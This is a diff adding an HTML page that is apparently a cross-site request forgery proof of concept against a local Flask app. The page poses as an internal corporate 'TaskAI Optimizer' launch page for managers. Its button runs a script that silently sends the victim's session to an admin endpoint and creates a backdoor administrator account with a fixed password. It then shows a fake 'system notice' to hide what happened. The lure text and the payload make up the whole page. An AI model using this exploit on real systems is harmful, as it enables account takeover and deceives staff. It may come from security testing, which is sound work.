@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CorpoTech Solutions - TaskAI Optimizer</title>
+    <link rel="stylesheet" href="http://localhost:5000/static/css/style.css">
+    <style>
+        .header {
+            background-color: #2c3e50;
+            color: white;
+            padding: 1rem 0;
+            margin-bottom: 2rem;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .header .container {
+            display: flex;
+            gap: 1rem;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+        }
+
+        .subtitle {
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+
+        .content-wrapper {
+            max-width: 600px;
+            margin: 3rem auto;
+            background: white;
+            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .content-wrapper h2 {
+            color: #2c3e50;
+            margin-bottom: 1.5rem;
+        }
+
+        .content-wrapper p {
+            line-height: 1.6;
+            color: #555;
+            margin-bottom: 1.5rem;
+        }
+
+        .btn-optimize {
+            background-color: #3498db;
+            color: white;
+            border: none;
+            padding: 0.75rem 1.5rem;
+            font-size: 1rem;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: background-color 0.3s;
+        }
+
+        .btn-optimize:hover {
+            background-color: #2980b9;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 2rem;
+            font-size: 0.75rem;
+            color: #999;
+            padding: 2rem 0;
+        }
+
+        .error-msg {
+            display: none;
+            margin-top: 2rem;
+            padding: 1rem;
+            background-color: #fff3cd;
+            color: #856404;
+            border-left: 4px solid #ffc107;
+            border-radius: 4px;
+            text-align: left;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Corporate Header Mock (matching app navbar style) -->
+    <div class="header">
+        <div class="container">
+            <div class="logo">CorpoTech Solutions</div>
+            <div class="subtitle">Internal IT Digital Transformation Portal</div>
+        </div>
+    </div>
+
+    <div class="content-wrapper">
+        <h2>🚀 Introducing TaskAI Optimizer</h2>
+        <p>
+            Boost your team's productivity by 40%. Our new enterprise AI tool automatically 
+            reassigns, prioritizes, and optimizes your ongoing tasks based on deadlines and workloads.
+        </p>
+        <p style="font-size: 14px; color: #666;">
+            <em>Pilot program exclusively available for Department Managers.</em>
+        </p>
+
+        <!-- THE CSRF PAYLOAD -->
+        <!-- Note: The target URL points to YOUR localhost Flask app -->
+        <button class="btn-optimize" onclick="silentAttack()">
+            Launch TaskAI Optimizer
+        </button>
+
+        <!-- WHAT THE VICTIM SEES AFTER CLICKING -->
+        <div id="fake-error" class="error-msg">
+            <strong>⚠️ System Notice:</strong><br>
+            The TaskAI Optimizer module is currently experiencing high latency due to internal API migration (JIRA-8842).<br><br>
+            Your request has been queued, but the UI is temporarily unavailable. No further action is required. 
+            IT Support has been notified automatically.
+        </div>
+    </div>
+
+    <div class="footer">
+        &copy; 2023 CorpoTech Solutions. Confidential - Internal Use Only. 
+        <br>If you did not expect this email, please contact helpdesk@corpotech.com
+    </div>
+
+    <script>
+        function silentAttack() {
+            const formData = new FormData();
+            formData.append('username', 'hacker_backdoor');
+            formData.append('email', 'hacker@evil.com');
+            formData.append('password', 'Hacked123!');
+            formData.append('role', 'admin');
+
+            fetch('http://localhost:5000/admin/users/create', {
+                method: 'POST',
+                body: formData,
+                credentials: 'include'
+            }).catch(() => {
+                // silence any network errors
+            });
+
+            document.querySelector('.btn-optimize').style.display = 'none';
+            document.getElementById('fake-error').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
